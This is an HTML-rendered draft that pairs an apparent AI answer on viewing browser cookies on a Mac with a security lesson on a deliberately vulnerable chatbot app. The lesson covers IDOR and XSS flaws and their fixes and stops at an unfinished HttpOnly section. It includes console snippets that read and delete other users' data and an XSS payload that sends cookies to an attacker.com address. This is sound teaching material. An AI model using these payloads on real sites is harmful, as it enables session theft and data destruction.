<!DOCTYPE html>
<html>
<head>
<title>Draft.md</title>
<meta http-equiv="Content-type" content="text/html;charset=UTF-8">

<style>
/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

body {
	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
	font-size: var(--vscode-markdown-font-size, 14px);
	padding: 0 26px;
	line-height: var(--vscode-markdown-line-height, 22px);
	word-wrap: break-word;
}

#code-csp-warning {
	position: fixed;
	top: 0;
	right: 0;
	color: white;
	margin: 16px;
	text-align: center;
	font-size: 12px;
	font-family: sans-serif;
	background-color:#444444;
	cursor: pointer;
	padding: 6px;
	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
}

#code-csp-warning:hover {
	text-decoration: none;
	background-color:#007acc;
	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
}

body.scrollBeyondLastLine {
	margin-bottom: calc(100vh - 22px);
}

body.showEditorSelection .code-line {
	position: relative;
}

body.showEditorSelection .code-active-line:before,
body.showEditorSelection .code-line:hover:before {
	content: "";
	display: block;
	position: absolute;
	top: 0;
	left: -12px;
	height: 100%;
}

body.showEditorSelection li.code-active-line:before,
body.showEditorSelection li.code-line:hover:before {
	left: -30px;
}

.vscode-light.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(0, 0, 0, 0.15);
}

.vscode-light.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(0, 0, 0, 0.40);
}

.vscode-light.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-dark.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 255, 255, 0.4);
}

.vscode-dark.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 255, 255, 0.60);
}

.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-high-contrast.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 160, 0, 0.7);
}

.vscode-high-contrast.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 160, 0, 1);
}

.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

img {
	max-width: 100%;
	max-height: 100%;
}

a {
	text-decoration: none;
}

a:hover {
	text-decoration: underline;
}

a:focus,
input:focus,
select:focus,
textarea:focus {
	outline: 1px solid -webkit-focus-ring-color;
	outline-offset: -1px;
}

hr {
	border: 0;
	height: 2px;
	border-bottom: 2px solid;
}

h1 {
	padding-bottom: 0.3em;
	line-height: 1.2;
	border-bottom-width: 1px;
	border-bottom-style: solid;
}

h1, h2, h3 {
	font-weight: normal;
}

table {
	border-collapse: collapse;
}

table > thead > tr > th {
	text-align: left;
	border-bottom: 1px solid;
}

table > thead > tr > th,
table > thead > tr > td,
table > tbody > tr > th,
table > tbody > tr > td {
	padding: 5px 10px;
}

table > tbody > tr + tr > td {
	border-top: 1px solid;
}

blockquote {
	margin: 0 7px 0 5px;
	padding: 0 16px 0 10px;
	border-left-width: 5px;
	border-left-style: solid;
}

code {
	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
	font-size: 1em;
	line-height: 1.357em;
}

body.wordWrap pre {
	white-space: pre-wrap;
}

pre:not(.hljs),
pre.hljs code > div {
	padding: 16px;
	border-radius: 3px;
	overflow: auto;
}

pre code {
	color: var(--vscode-editor-foreground);
	tab-size: 4;
}

/** Theming */

.vscode-light pre {
	background-color: rgba(220, 220, 220, 0.4);
}

.vscode-dark pre {
	background-color: rgba(10, 10, 10, 0.4);
}

.vscode-high-contrast pre {
	background-color: rgb(0, 0, 0);
}

.vscode-high-contrast h1 {
	border-color: rgb(0, 0, 0);
}

.vscode-light table > thead > tr > th {
	border-color: rgba(0, 0, 0, 0.69);
}

.vscode-dark table > thead > tr > th {
	border-color: rgba(255, 255, 255, 0.69);
}

.vscode-light h1,
.vscode-light hr,
.vscode-light table > tbody > tr + tr > td {
	border-color: rgba(0, 0, 0, 0.18);
}

.vscode-dark h1,
.vscode-dark hr,
.vscode-dark table > tbody > tr + tr > td {
	border-color: rgba(255, 255, 255, 0.18);
}

</style>

<style>
/* Tomorrow Theme */
/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
/* Original theme - https://github.com/chriskempson/tomorrow-theme */

/* Tomorrow Comment */
.hljs-comment,
.hljs-quote {
	color: #8e908c;
}

/* Tomorrow Red */
.hljs-variable,
.hljs-template-variable,
.hljs-tag,
.hljs-name,
.hljs-selector-id,
.hljs-selector-class,
.hljs-regexp,
.hljs-deletion {
	color: #c82829;
}

/* Tomorrow Orange */
.hljs-number,
.hljs-built_in,
.hljs-builtin-name,
.hljs-literal,
.hljs-type,
.hljs-params,
.hljs-meta,
.hljs-link {
	color: #f5871f;
}

/* Tomorrow Yellow */
.hljs-attribute {
	color: #eab700;
}

/* Tomorrow Green */
.hljs-string,
.hljs-symbol,
.hljs-bullet,
.hljs-addition {
	color: #718c00;
}

/* Tomorrow Blue */
.hljs-title,
.hljs-section {
	color: #4271ae;
}

/* Tomorrow Purple */
.hljs-keyword,
.hljs-selector-tag {
	color: #8959a8;
}

.hljs {
	display: block;
	overflow-x: auto;
	color: #4d4d4c;
	padding: 0.5em;
}

.hljs-emphasis {
	font-style: italic;
}

.hljs-strong {
	font-weight: bold;
}
</style>

<style>
/*
 * Markdown PDF CSS
 */

 body {
	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
	padding: 0 12px;
}

pre {
	background-color: #f8f8f8;
	border: 1px solid #cccccc;
	border-radius: 3px;
	overflow-x: auto;
	white-space: pre-wrap;
	overflow-wrap: break-word;
}

pre:not(.hljs) {
	padding: 23px;
	line-height: 19px;
}

blockquote {
	background: rgba(127, 127, 127, 0.1);
	border-color: rgba(0, 122, 204, 0.5);
}

.emoji {
	height: 1.4em;
}

code {
	font-size: 14px;
	line-height: 19px;
}

/* for inline code */
:not(pre):not(.hljs) > code {
	color: #C9AE75; /* Change the old color so it seems less like an error */
	font-size: inherit;
}

/* Page Break : use <div class="page"/> to insert page break
-------------------------------------------------------- */
.page {
	page-break-after: always;
}

</style>

<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
</head>
<body>
  <script>
    mermaid.initialize({
      startOnLoad: true,
      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
          ? 'dark'
          : 'default'
    });
  </script>
<h3 id="what-are-browser-cookies">What Are Browser Cookies?</h3>
<p>Browser cookies are small pieces of data stored by websites on your device to remember information like login details, preferences, or tracking data. They're not harmful by default but can raise privacy concerns. Finding and managing them is straightforward in most browsers. Below, I'll outline general steps for popular browsers on macOS (as you mentioned Mac). These instructions are based on the latest versions as of November 2025 (e.g., Chrome 131+, Firefox 132+). If you're on a different OS, the steps are similar but menu paths might vary slightly.</p>
<h3 id="viewing-cookies-in-google-chrome-on-mac">Viewing Cookies in Google Chrome on Mac</h3>
<ol>
<li>Open Chrome.</li>
<li>Click the three-dot menu in the top-right corner &gt; <strong>Settings</strong>.</li>
<li>Go to <strong>Privacy and security</strong> &gt; <strong>Cookies and other site data</strong>.</li>
<li>Under &quot;See all site data and permissions,&quot; click <strong>All site data and permissions</strong>.</li>
<li>Search for a specific site or browse the list to view stored cookies.
<ul>
<li>To inspect in real-time: Press <code>Command + Option + I</code> to open DevTools &gt; Go to the <strong>Application</strong> tab &gt; Under Storage, expand <strong>Cookies</strong> to see details for the current site.</li>
</ul>
</li>
</ol>
<p>Alternatively, for a quick view during browsing: Right-click on a webpage &gt; <strong>Inspect</strong> &gt; Follow the DevTools steps above.</p>
<h3 id="viewing-cookies-in-mozilla-firefox-on-mac">Viewing Cookies in Mozilla Firefox on Mac</h3>
<ol>
<li>Open Firefox.</li>
<li>Click the three-line menu in the top-right &gt; <strong>Settings</strong>.</li>
<li>Select <strong>Privacy &amp; Security</strong> &gt; Scroll to <strong>Cookies and Site Data</strong>.</li>
<li>Click <strong>Manage Data</strong> to see a list of sites with stored cookies.
<ul>
<li>You can search, view details, or remove them here.</li>
</ul>
</li>
<li>For developer inspection: Press <code>Command + Option + I</code> to open Web Developer Tools &gt; Go to the <strong>Storage</strong> tab &gt; Expand <strong>Cookies</strong> for the current domain.</li>
</ol>
<h3 id="viewing-cookies-in-safari-on-mac-built-in-browser">Viewing Cookies in Safari on Mac (Built-in Browser)</h3>
<ol>
<li>Open Safari.</li>
<li>Go to <strong>Safari</strong> menu (top-left) &gt; <strong>Settings</strong> (or <code>Command + ,</code>).</li>
<li>Click the <strong>Privacy</strong> tab.</li>
<li>Click <strong>Manage Website Data</strong> to list all sites with cookies/storage.
<ul>
<li>Search or select a site to view/remove data.</li>
</ul>
</li>
</ol>
<h3 id="general-tips-for-managing-cookies-across-browsers">General Tips for Managing Cookies Across Browsers</h3>
<ul>
<li><strong>Extensions/Add-ons</strong>: Use tools like &quot;Cookie AutoDelete&quot; (Chrome/Firefox) or &quot;EditThisCookie&quot; for easier management.</li>
<li><strong>Incognito/Private Mode</strong>: Cookies aren't saved permanently in these modes.</li>
<li><strong>Clearing Cookies</strong>: In settings, look for &quot;Clear browsing data&quot; options to delete them selectively or all at once.</li>
<li><strong>Privacy Settings</strong>: Enable &quot;Block third-party cookies&quot; in privacy sections to limit tracking.</li>
<li><strong>Command-Line Access (Advanced)</strong>: On Mac, cookies are stored in files like <code>~/Library/Application Support/Google/Chrome/Default/Cookies</code> (SQLite format). Use tools like <code>sqlite3</code> in Terminal to query them, but back up first.</li>
<li><strong>Cross-Browser Tools</strong>: Apps like &quot;CCleaner&quot; or macOS's built-in privacy scanners can scan for cookies system-wide.</li>
</ul>
<p>If you meant something else by &quot;cookies&quot; (e.g., the baked goods), let me know for food recommendations! If this is about a specific site or issue, provide more details.</p>
<hr>
<h1 id="idor-insecure-direct-object-reference-vulnerability-explanation">IDOR (Insecure Direct Object Reference) Vulnerability Explanation</h1>
<h2 id="what-is-idor">What is IDOR?</h2>
<p>IDOR occurs when an application uses user-supplied input to access objects directly (like database records) <strong>without proper authorization checks</strong>. Attackers can manipulate parameters (like IDs in URLs) to access or modify data belonging to other users.</p>
<hr>
<h2 id="idor-examples-in-this-vulnerable-chatbot">IDOR Examples in This Vulnerable Chatbot</h2>
<h3 id="1-get-messages-lines-340-350---classic-idor-read-vulnerability">1. <strong>Get Messages (Lines 340-350)</strong> - Classic IDOR Read Vulnerability</h3>
<pre class="hljs"><code><div><span class="hljs-comment">// ‚ùå VULNERABILITY: IDOR - No authorization check</span>
app.get(<span class="hljs-string">'/api/messages/:userId'</span>, (req, res) =&gt; {
  <span class="hljs-keyword">const</span> requestedUserId = <span class="hljs-built_in">parseInt</span>(req.params.userId);
  
  <span class="hljs-comment">// ‚ùå VULNERABILITY: No check if current user can access this userId's data!</span>
  <span class="hljs-comment">// Should verify: req.session.userId === requestedUserId</span>
  
  <span class="hljs-keyword">const</span> userMessages = mockDB.messages.filter(<span class="hljs-function"><span class="hljs-params">m</span> =&gt;</span> m.userId === requestedUserId);
  
  res.json({ <span class="hljs-attr">messages</span>: userMessages });
});
</div></code></pre>
<p><strong>The Problem:</strong></p>
<ul>
<li>Anyone can read <strong>anyone else's messages</strong> by changing the <code>userId</code> in the URL</li>
<li>You're logged in as user ID 5</li>
<li>You request <code>/api/messages/1</code> (admin's messages)</li>
<li>Server returns admin's messages <strong>without checking</strong> if you're allowed to see them</li>
</ul>
<p><strong>Attack Example:</strong></p>
<pre class="hljs"><code><div><span class="hljs-comment">// In browser console:</span>
fetch(<span class="hljs-string">'/api/messages/1'</span>)  <span class="hljs-comment">// Read admin's messages (user ID 1)</span>
  .then(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.json())
  .then(<span class="hljs-built_in">console</span>.log);
</div></code></pre>
<hr>
<h3 id="2-delete-messages-lines-352-370---idor-writedelete-vulnerability">2. <strong>Delete Messages (Lines 352-370)</strong> - IDOR Write/Delete Vulnerability</h3>
<pre class="hljs"><code><div><span class="hljs-comment">// ‚ùå VULNERABILITY: IDOR - Delete messages without authorization</span>
app.delete(<span class="hljs-string">'/api/messages/:userId'</span>, (req, res) =&gt; {
  <span class="hljs-keyword">const</span> requestedUserId = <span class="hljs-built_in">parseInt</span>(req.params.userId);
  
  <span class="hljs-comment">// ‚ùå VULNERABILITY: No authorization check - anyone can delete any user's messages!</span>
  <span class="hljs-comment">// Should verify: req.session.userId === requestedUserId</span>
  
  <span class="hljs-keyword">const</span> beforeCount = mockDB.messages.length;
  mockDB.messages = mockDB.messages.filter(<span class="hljs-function"><span class="hljs-params">m</span> =&gt;</span> m.userId !== requestedUserId);
  <span class="hljs-keyword">const</span> afterCount = mockDB.messages.length;
  <span class="hljs-keyword">const</span> deleted = beforeCount - afterCount;
  
  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`üóëÔ∏è Deleted <span class="hljs-subst">${deleted}</span> messages for user <span class="hljs-subst">${requestedUserId}</span> (No auth check!)`</span>);
  
  res.json({ 
    <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, 
    <span class="hljs-attr">deleted</span>: deleted,
    <span class="hljs-attr">message</span>: <span class="hljs-string">`Deleted <span class="hljs-subst">${deleted}</span> messages from server`</span>
  });
});
</div></code></pre>
<p><strong>The Problem:</strong></p>
<ul>
<li>You can <strong>delete anyone's chat history</strong>, not just your own</li>
<li>No ownership verification</li>
<li>No confirmation required</li>
</ul>
<p><strong>Attack Example:</strong></p>
<pre class="hljs"><code><div><span class="hljs-comment">// In browser console:</span>
fetch(<span class="hljs-string">'/api/messages/1'</span>, { <span class="hljs-attr">method</span>: <span class="hljs-string">'DELETE'</span> })  <span class="hljs-comment">// Delete all admin's messages</span>
  .then(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.json())
  .then(<span class="hljs-built_in">console</span>.log);
</div></code></pre>
<hr>
<h3 id="3-delete-comments-lines-487-503---idor-on-comments">3. <strong>Delete Comments (Lines 487-503)</strong> - IDOR on Comments</h3>
<pre class="hljs"><code><div><span class="hljs-comment">// ‚ùå VULNERABILITY: Delete comment - No authorization check</span>
app.delete(<span class="hljs-string">'/api/comments/:commentId'</span>, (req, res) =&gt; {
  <span class="hljs-keyword">const</span> commentId = <span class="hljs-built_in">parseInt</span>(req.params.commentId);
  
  <span class="hljs-keyword">const</span> commentIndex = mockDB.comments.findIndex(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> c.id === commentId);
  
  <span class="hljs-keyword">if</span> (commentIndex === <span class="hljs-number">-1</span>) {
    <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">404</span>).json({ <span class="hljs-attr">error</span>: <span class="hljs-string">'Comment not found'</span> });
  }
  
  <span class="hljs-comment">// ‚ùå VULNERABILITY: No check if user owns this comment!</span>
  <span class="hljs-comment">// Anyone can delete any comment</span>
  
  mockDB.comments.splice(commentIndex, <span class="hljs-number">1</span>);
  
  res.json({ 
    <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, 
    <span class="hljs-attr">message</span>: <span class="hljs-string">'Comment deleted (No authorization check - VULNERABILITY!)'</span> 
  });
});
</div></code></pre>
<p><strong>The Problem:</strong></p>
<ul>
<li>Anyone can delete <strong>anyone's comments</strong> by sending <code>DELETE /api/comments/1</code></li>
<li>No ownership check</li>
<li>Enables vandalism and censorship</li>
</ul>
<p><strong>Attack Example:</strong></p>
<pre class="hljs"><code><div><span class="hljs-comment">// In browser console:</span>
fetch(<span class="hljs-string">'/api/comments/1'</span>, { <span class="hljs-attr">method</span>: <span class="hljs-string">'DELETE'</span> })  <span class="hljs-comment">// Delete comment ID 1</span>
  .then(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.json())
  .then(<span class="hljs-built_in">console</span>.log);
</div></code></pre>
<hr>
<h2 id="what-makes-it-idor">What Makes It IDOR?</h2>
<p>The <strong>missing authorization check</strong>. Here's the difference:</p>
<h3 id="%E2%9D%8C-vulnerable-code-current">‚ùå VULNERABLE CODE (Current):</h3>
<pre class="hljs"><code><div>app.get(<span class="hljs-string">'/api/messages/:userId'</span>, (req, res) =&gt; {
  <span class="hljs-keyword">const</span> requestedUserId = <span class="hljs-built_in">parseInt</span>(req.params.userId);
  <span class="hljs-comment">// NO CHECK HERE! ‚ö†Ô∏è Anyone can access any userId</span>
  <span class="hljs-keyword">const</span> userMessages = mockDB.messages.filter(<span class="hljs-function"><span class="hljs-params">m</span> =&gt;</span> m.userId === requestedUserId);
  res.json({ <span class="hljs-attr">messages</span>: userMessages });
});
</div></code></pre>
<h3 id="%E2%9C%85-secure-code-how-it-should-be">‚úÖ SECURE CODE (How it should be):</h3>
<pre class="hljs"><code><div>app.get(<span class="hljs-string">'/api/messages/:userId'</span>, (req, res) =&gt; {
  <span class="hljs-keyword">const</span> requestedUserId = <span class="hljs-built_in">parseInt</span>(req.params.userId);
  
  <span class="hljs-comment">// ‚úÖ AUTHORIZATION CHECK:</span>
  <span class="hljs-keyword">if</span> (req.session.userId !== requestedUserId) {
    <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">403</span>).json({ 
      <span class="hljs-attr">error</span>: <span class="hljs-string">'Forbidden: You can only access your own messages'</span> 
    });
  }
  
  <span class="hljs-keyword">const</span> userMessages = mockDB.messages.filter(<span class="hljs-function"><span class="hljs-params">m</span> =&gt;</span> m.userId === requestedUserId);
  res.json({ <span class="hljs-attr">messages</span>: userMessages });
});
</div></code></pre>
<hr>
<h2 id="key-takeaway">Key Takeaway</h2>
<p><strong>IDOR happens when:</strong></p>
<ol>
<li>URL/request parameters directly reference objects (<code>:userId</code>, <code>:commentId</code>)</li>
<li>The application <strong>trusts</strong> the parameter without verification</li>
<li><strong>No authorization check</strong> confirms the current user owns/can access that object</li>
</ol>
<p><strong>The fix:</strong> Always verify that <code>req.session.userId === requestedUserId</code> (or similar ownership check) before allowing access to sensitive data.</p>
<hr>
<h2 id="red-team-testing">Red Team Testing</h2>
<p>Try these in your browser console after logging in:</p>
<pre class="hljs"><code><div><span class="hljs-comment">// 1. Read admin's messages (IDOR Read)</span>
fetch(<span class="hljs-string">'/api/messages/1'</span>).then(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.json()).then(<span class="hljs-built_in">console</span>.log);

<span class="hljs-comment">// 2. Delete admin's messages (IDOR Delete)</span>
fetch(<span class="hljs-string">'/api/messages/1'</span>, { <span class="hljs-attr">method</span>: <span class="hljs-string">'DELETE'</span> }).then(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.json()).then(<span class="hljs-built_in">console</span>.log);

<span class="hljs-comment">// 3. Delete any comment (IDOR Delete)</span>
fetch(<span class="hljs-string">'/api/comments/1'</span>, { <span class="hljs-attr">method</span>: <span class="hljs-string">'DELETE'</span> }).then(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.json()).then(<span class="hljs-built_in">console</span>.log);

<span class="hljs-comment">// 4. Enumerate all users by trying different IDs</span>
<span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">1</span>; i&lt;=<span class="hljs-number">10</span>; i++) {
  fetch(<span class="hljs-string">`/api/messages/<span class="hljs-subst">${i}</span>`</span>).then(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.json()).then(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> {
    <span class="hljs-keyword">if</span>(data.messages.length &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`User <span class="hljs-subst">${i}</span> has <span class="hljs-subst">${data.messages.length}</span> messages`</span>);
    }
  });
}
</div></code></pre>
<hr>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Data Breach:</strong> Read other users' private conversations</li>
<li><strong>Data Loss:</strong> Delete other users' messages/comments</li>
<li><strong>Privacy Violation:</strong> Access sensitive user information</li>
<li><strong>Reputation Damage:</strong> Users lose trust when their data is exposed</li>
<li><strong>Compliance Issues:</strong> GDPR, HIPAA violations if deployed in production</li>
</ul>
<hr>
<h1 id="xss-cross-site-scripting-defense-guide">XSS (Cross-Site Scripting) Defense Guide</h1>
<h2 id="what-is-xss">What is XSS?</h2>
<p>XSS allows attackers to inject malicious JavaScript into web pages viewed by other users. This vulnerable chatbot has <strong>two types of XSS</strong>:</p>
<ol>
<li><strong>Stored XSS</strong> - Malicious scripts stored in the database (comments board)</li>
<li><strong>Reflected XSS</strong> - Malicious scripts in chat responses (LLM output)</li>
</ol>
<hr>
<h2 id="current-xss-vulnerabilities">Current XSS Vulnerabilities</h2>
<h3 id="1-stored-xss-in-comments-commentsjs-line-67">1. Stored XSS in Comments (<code>comments.js</code> line 67)</h3>
<pre class="hljs"><code><div><span class="hljs-comment">// ‚ùå VULNERABLE CODE:</span>
commentDiv.innerHTML = <span class="hljs-string">`
  &lt;div class="comment-header"&gt;
    &lt;span class="username"&gt;<span class="hljs-subst">${comment.username}</span>&lt;/span&gt;
    &lt;span class="timestamp"&gt;<span class="hljs-subst">${<span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>(comment.timestamp).toLocaleString()}</span>&lt;/span&gt;
  &lt;/div&gt;
  &lt;div class="comment-text"&gt;<span class="hljs-subst">${comment.text}</span>&lt;/div&gt;  &lt;!-- XSS HERE! --&gt;
  &lt;button class="btn btn-sm btn-danger" onclick="deleteComment(<span class="hljs-subst">${comment.id}</span>)"&gt;Delete&lt;/button&gt;
`</span>;
</div></code></pre>
<p><strong>Attack Payload:</strong></p>
<pre class="hljs"><code><div><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"fetch('https://attacker.com/exfil?cookie='+document.cookie)"</span>&gt;</span>
</div></code></pre>
<h3 id="2-reflected-xss-in-chat-appjs-line-168">2. Reflected XSS in Chat (<code>app.js</code> line 168)</h3>
<pre class="hljs"><code><div><span class="hljs-comment">// ‚ùå VULNERABLE CODE:</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addMessage</span>(<span class="hljs-params">text, sender</span>) </span>{
  <span class="hljs-keyword">const</span> textDiv = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'div'</span>);
  textDiv.className = <span class="hljs-string">`message-text <span class="hljs-subst">${sender}</span>`</span>;
  textDiv.innerHTML = text;  <span class="hljs-comment">// ‚ùå Should use textContent or DOMPurify!</span>
  messageDiv.appendChild(textDiv);
}
</div></code></pre>
<p><strong>Attack Payload:</strong></p>
<pre class="hljs"><code><div><span class="hljs-comment">// In chat, send:</span>
&lt;img src=x onerror=alert(<span class="hljs-built_in">document</span>.cookie)&gt;
</div></code></pre>
<hr>
<h2 id="defense-strategy-multi-layer-approach">Defense Strategy: Multi-Layer Approach</h2>
<h3 id="layer-1-input-sanitization-server-side-%E2%AD%90-most-important">Layer 1: Input Sanitization (Server-Side) ‚≠ê MOST IMPORTANT</h3>
<p><strong>Install DOMPurify for Node.js:</strong></p>
<pre class="hljs"><code><div>npm install isomorphic-dompurify
</div></code></pre>
<p><strong>Update <code>server.js</code> - Sanitize comment input (Line ~460):</strong></p>
<pre class="hljs"><code><div><span class="hljs-comment">// Add at top of file:</span>
<span class="hljs-keyword">const</span> createDOMPurify = <span class="hljs-built_in">require</span>(<span class="hljs-string">'isomorphic-dompurify'</span>);
<span class="hljs-keyword">const</span> DOMPurify = createDOMPurify();

<span class="hljs-comment">// ‚úÖ SECURE CODE: Post comment with sanitization</span>
app.post(<span class="hljs-string">'/api/comments'</span>, (req, res) =&gt; {
  <span class="hljs-keyword">const</span> { text } = req.body;
  
  <span class="hljs-keyword">if</span> (!text || <span class="hljs-keyword">typeof</span> text !== <span class="hljs-string">'string'</span>) {
    <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">400</span>).json({ <span class="hljs-attr">error</span>: <span class="hljs-string">'Comment text required'</span> });
  }
  
  <span class="hljs-comment">// ‚úÖ SANITIZE INPUT: Remove all HTML/JavaScript</span>
  <span class="hljs-keyword">const</span> sanitizedText = DOMPurify.sanitize(text, { 
    <span class="hljs-attr">ALLOWED_TAGS</span>: [],  <span class="hljs-comment">// No HTML allowed at all</span>
    <span class="hljs-attr">ALLOWED_ATTR</span>: []
  });
  
  <span class="hljs-keyword">const</span> username = req.session.username || <span class="hljs-string">'Anonymous'</span>;
  
  <span class="hljs-keyword">const</span> comment = {
    <span class="hljs-attr">id</span>: commentIdCounter++,
    <span class="hljs-attr">username</span>: username,
    <span class="hljs-attr">text</span>: sanitizedText,  <span class="hljs-comment">// ‚úÖ Store sanitized text</span>
    <span class="hljs-attr">timestamp</span>: <span class="hljs-built_in">Date</span>.now()
  };
  
  mockDB.comments.push(comment);
  
  res.json({ 
    <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, 
    <span class="hljs-attr">comment</span>: comment
  });
});
</div></code></pre>
<p><strong>Alternative: Strip all HTML tags (simpler):</strong></p>
<pre class="hljs"><code><div><span class="hljs-comment">// Simple regex to remove all HTML tags</span>
<span class="hljs-keyword">const</span> sanitizedText = text.replace(<span class="hljs-regexp">/&lt;[^&gt;]*&gt;/g</span>, <span class="hljs-string">''</span>);
</div></code></pre>
<hr>
<h3 id="layer-2-output-encoding-frontend">Layer 2: Output Encoding (Frontend)</h3>
<p><strong>Option A: Use <code>textContent</code> instead of <code>innerHTML</code></strong> (Best for plain text)</p>
<pre class="hljs"><code><div><span class="hljs-comment">// ‚úÖ SECURE CODE: Use textContent</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addMessage</span>(<span class="hljs-params">text, sender</span>) </span>{
  <span class="hljs-keyword">const</span> textDiv = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'div'</span>);
  textDiv.className = <span class="hljs-string">`message-text <span class="hljs-subst">${sender}</span>`</span>;
  textDiv.textContent = text;  <span class="hljs-comment">// ‚úÖ SAFE: Automatically escapes HTML</span>
  messageDiv.appendChild(textDiv);
}
</div></code></pre>
<p><strong>Option B: Use DOMPurify (Client-Side)</strong> (Best if you need some HTML)</p>
<pre class="hljs"><code><div><span class="hljs-comment">&lt;!-- Add to index.html and comments.html --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</div></code></pre>
<pre class="hljs"><code><div><span class="hljs-comment">// ‚úÖ SECURE CODE: DOMPurify in comments.js</span>
commentDiv.innerHTML = <span class="hljs-string">`
  &lt;div class="comment-header"&gt;
    &lt;span class="username"&gt;<span class="hljs-subst">${DOMPurify.sanitize(comment.username)}</span>&lt;/span&gt;
    &lt;span class="timestamp"&gt;<span class="hljs-subst">${<span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>(comment.timestamp).toLocaleString()}</span>&lt;/span&gt;
  &lt;/div&gt;
  &lt;div class="comment-text"&gt;<span class="hljs-subst">${DOMPurify.sanitize(comment.text)}</span>&lt;/div&gt;
  &lt;button class="btn btn-sm btn-danger" onclick="deleteComment(<span class="hljs-subst">${comment.id}</span>)"&gt;Delete&lt;/button&gt;
`</span>;
</div></code></pre>
<hr>
<h3 id="layer-3-content-security-policy-csp">Layer 3: Content Security Policy (CSP)</h3>
<p><strong>Add CSP headers in <code>server.js</code> (Line ~20, before routes):</strong></p>
<pre class="hljs"><code><div><span class="hljs-comment">// ‚úÖ SECURE: Content Security Policy</span>
app.use(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
  res.setHeader(
    <span class="hljs-string">'Content-Security-Policy'</span>,
    <span class="hljs-string">"default-src 'self'; "</span> +
    <span class="hljs-string">"script-src 'self' https://cdn.jsdelivr.net; "</span> +  <span class="hljs-comment">// Allow DOMPurify CDN</span>
    <span class="hljs-string">"style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; "</span> +  <span class="hljs-comment">// Bootstrap</span>
    <span class="hljs-string">"img-src 'self' data: https:; "</span> +
    <span class="hljs-string">"connect-src 'self' https://router.huggingface.co; "</span> +  <span class="hljs-comment">// API calls</span>
    <span class="hljs-string">"frame-ancestors 'none'; "</span> +
    <span class="hljs-string">"base-uri 'self'; "</span> +
    <span class="hljs-string">"form-action 'self'"</span>
  );
  
  <span class="hljs-comment">// Additional security headers</span>
  res.setHeader(<span class="hljs-string">'X-Content-Type-Options'</span>, <span class="hljs-string">'nosniff'</span>);
  res.setHeader(<span class="hljs-string">'X-Frame-Options'</span>, <span class="hljs-string">'DENY'</span>);
  res.setHeader(<span class="hljs-string">'X-XSS-Protection'</span>, <span class="hljs-string">'1; mode=block'</span>);
  res.setHeader(<span class="hljs-string">'Referrer-Policy'</span>, <span class="hljs-string">'strict-origin-when-cross-origin'</span>);
  
  next();
});
</div></code></pre>
<p><strong>What CSP does:</strong></p>
<ul>
<li>Blocks inline <code>&lt;script&gt;</code> tags</li>
<li>Blocks <code>eval()</code> and inline event handlers (<code>onerror</code>, <code>onclick</code> in HTML)</li>
<li>Only allows scripts from trusted domains</li>
<li>Prevents XSS even if attacker bypasses sanitization</li>
</ul>
<hr>
<h3 id="layer-4-httponly-cookies-prevents-cookie-theft">Layer 4: HttpOnly Cookies (Prevents Cookie Theft)</h3>
